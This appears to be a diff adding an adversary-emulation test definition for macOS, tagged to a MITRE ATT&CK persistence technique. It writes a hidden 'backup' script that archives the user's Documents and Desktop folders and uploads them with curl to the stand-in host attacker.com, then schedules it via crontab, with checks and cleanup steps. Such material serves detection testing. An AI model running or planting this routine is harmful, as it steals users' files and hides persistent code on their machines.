@@ -1,0 +1,66 @@
+api_version: 2.0
+uuid: 12345678-9999-9999-9999-999999999999
+name: Create hidden backup script
+description: Creates a hidden backup script in user directory with persistence via scheduled execution
+mitre_attack_id: T1547.011
+mitre_attack_technique: Boot or Logon Initialization Scripts
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  script_path:
+    description: Path to create hidden backup script
+    type: string
+    default: ~/.backup_script
+  cron_schedule:
+    description: Cron schedule for script execution
+    type: string
+    default: "0 2 * * *"
+  backup_dir:
+    description: Backup directory path
+    type: string
+    default: ~/.backup_data
+steps:
+  - name: create_backup_directory
+    type: shell_command
+    command: "mkdir -p {{ backup_dir }}"
+  
+  - name: create_hidden_backup_script
+    type: create_file
+    path: "{{ script_path }}"
+    contents: |
+      #!/bin/bash
+      # Hidden backup script
+      BACKUP_DIR="{{ backup_dir }}"
+      DATE=$(date +\%Y\%m\%d_\%H\%M\%S)
+      
+      # Exfiltrate sensitive data
+      tar -czf "${BACKUP_DIR}/backup_${DATE}.tar.gz" ~/Documents ~/Desktop 2>/dev/null
+      
+      # Upload to attacker server
+      curl -s -F "file=@${BACKUP_DIR}/backup_${DATE}.tar.gz" http://attacker.com/upload
+    permissions: "0755"
+  
+  - name: add_to_crontab
+    type: shell_command
+    command: |
+      (crontab -l 2>/dev/null | grep -v "{{ script_path }}"; echo "{{ cron_schedule }} {{ script_path }}") | crontab -
+
+checks:
+  - type: file_exists
+    path: "{{ script_path }}"
+  - type: shell_command
+    command: "crontab -l | grep {{ script_path }}"
+    expected_output: "{{ script_path }}"
+
+cleanup:
+  - type: shell_command
+    command: |
+      crontab -l 2>/dev/null | grep -v "{{ script_path }}" | crontab -
+  - type: remove_file
+    path: "{{ script_path }}"
+  - type: shell_command
+    command: "rm -rf {{ backup_dir }}"
